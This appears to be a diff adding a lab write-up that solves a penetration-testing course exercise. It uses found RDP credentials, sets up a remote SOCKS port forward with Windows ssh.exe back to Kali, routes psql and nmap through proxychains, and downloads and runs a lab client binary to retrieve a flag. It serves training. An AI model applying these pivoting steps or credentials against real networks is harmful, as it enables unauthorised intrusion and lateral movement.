@@ -1,0 +1,64 @@
+Questions 
+Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database (rdp_admin:P@ssw0rd!). Enumerate which port forwarding techniques are available, then use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.
+Download the ssh_exe_exercise_client.bin binary from http://MULTISERVER03/umbraco/ssh_exe_exercise_client.bin to your Kali machine, and run it against port 4141 on PGDATABASE01, through the port forward you create. Once a successful connection is made, the client will print the flag it gets from the server.
+
+Note: the source files used to build the ssh_exe_exercise_client.bin binary can be downloaded from /umbraco/client_source.zip.
+
+# The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update),1 and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update).2 On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.
+
+# Create a remote dynamic port forward from MULTISERVER03 (a Windows machine) to our Kali machine using RDP port.
+
+# Make sure SSH server is running on Kali
+sudo systemctl status ssh
+
+# rdp to MULTISERVER03
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.180.64
+
+# Open cmd and find the ssh.exe
+C:\Users\rdp_admin>where ssh.exe
+C:\Windows\System32\OpenSSH\ssh.exe
+C:\Users\rdp_admin>ssh.exe -V
+OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
+
+# We can now create a remote dynamic port forward to our Kali machine, just as we did earlier. We'll pass the port 9998 to -R and authenticate as kali back on our Kali machine.
+
+C:\Users\rdp_admin>ssh -N -R 9997 kali@192.168.45.237
+
+# Check the port forwarding status on KALI 
+ss -tulpn 
+...
+tcp     LISTEN   0        128             127.0.0.1:9997           0.0.0.0:* 
+...
+
+# Create a SOCKS5 proxychains
+sudo nano /etc/proxychains4.conf 
+...
+socks5 127.0.0.1 9997
+...
+
+proxychains psql -h 10.4.180.215 -U postgres
+password: D@t4basePassw0rd!
+
+# Okay it works!, lets proceed to the Questions
+
+proxychains nmap -sT -Pn -p4141 10.4.180.215
+...
+4141/tcp open  oirtgsvc
+...
+
+# Prepare the payload
+wget http://192.168.180.64/umbraco/ssh_exe_exercise_client.bin
+chmod 755 ssh_exe_exercise_client.bin
+
+# exploit
+proxychains ./ssh_exe_exercise_client.bin -i 10.4.180.215 -p 4141
+...
+[proxychains] Strict chain  ...  127.0.0.1:9997  ...  10.4.180.215:4141  ...  OK
+Flag: "OS{54f69e8e2ddabfffae5ce9e072b139ec}"
+...
+
+
+
+
+
+
